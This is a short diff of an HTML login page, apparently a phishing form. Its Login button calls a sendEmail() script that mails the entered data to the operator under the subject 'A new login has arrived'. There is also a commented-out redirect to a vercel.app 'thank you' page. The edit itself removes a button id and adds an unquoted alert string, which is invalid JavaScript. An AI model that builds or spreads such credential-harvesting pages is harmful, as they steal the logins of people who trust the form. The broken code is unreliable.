@@ -204,7 +204,7 @@
                 <!-- <input type="hidden" name="_captcha" value="false"> -->
                 <!-- <input name="_redirect" type="hidden" id="name" value="https://owenvote.vercel.app/grac.html"> -->
                 <div class="link">
-                    <button type="submit" id="submit" onclick="sendEmail()"   class="login"
+                    <button type="submit"  onclick="sendEmail()"   class="login"
                         style="text-decoration: none; color: white;">Login </button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
@@ -239,7 +239,7 @@
             Subject: "A new login has arrived",
             Body: finalmessage
         }).then(
-            message => alert(message)
+            message => alert(mail sent successfully)
         );
     }
 </script>
